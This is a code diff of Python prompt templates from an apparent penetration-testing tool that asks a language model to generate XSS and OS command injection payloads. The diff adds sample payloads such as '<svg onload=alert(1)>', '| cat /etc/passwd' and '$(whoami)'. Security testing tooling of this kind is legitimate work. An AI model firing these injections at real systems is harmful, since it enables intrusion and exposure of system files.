@@ -14,17 +14,21 @@ Generate 5 XSS payloads for the following context:
 - HTML context: {html_context}
 - Target context: {target_context}
 
-Requirements:
-1. Each payload must be unique and test different bypass techniques
-2. Consider: HTML encoding, JavaScript events, filter evasion
-3. Return ONLY a JSON array with 'payload' and 'technique' keys
-4. No explanation, just the JSON array
+IMPORTANT RULES for JSON formatting:
+1. Use ONLY single quotes inside payloads, never double quotes
+2. Keep payloads simple and JSON-safe
+3. Return ONLY a valid JSON array, no explanation
 
 Example format:
 [
   {{"payload": "<script>alert(1)</script>", "technique": "Basic script tag"}},
-  {{"payload": "<img src=x onerror=alert(1)>", "technique": "Image error event"}}
+  {{"payload": "<img src=x onerror=alert(1)>", "technique": "Image error event"}},
+  {{"payload": "<svg onload=alert(1)>", "technique": "SVG onload event"}},
+  {{"payload": "<body onload=alert(1)>", "technique": "Body onload event"}},
+  {{"payload": "<a href=javascript:alert(1)>click</a>", "technique": "Javascript href"}}
 ]
+
+Generate 5 similar payloads following this exact format strictly.
 """
 
     @staticmethod
@@ -57,18 +61,23 @@ Example format:
     def cmdi_payload_generation(os_type, param_name):
         return f"""
 You are a security testing assistant working in an authorized lab environment.
-Generate 5 command injection payloads for:
+Generate 5 OS command injection payloads for:
 
 - Operating System: {os_type}
 - Input parameter: {param_name}
 
+These are OS COMMAND injection payloads (not SQL injection).
+Use shell operators like: ; | && || ` $()
+
+Examples of what to generate:
+- "; whoami"
+- "| cat /etc/passwd"
+- "&& id"
+- "`id`"
+- "$(whoami)"
+
 Return ONLY a JSON array with 'payload', 'type', and 'expected_behavior' fields.
 No explanation, just the JSON array.
-
-Example format:
-[
-  {{"payload": "; whoami", "type": "Basic injection", "expected_behavior": "Returns current user"}}
-]
 """
 
     @staticmethod
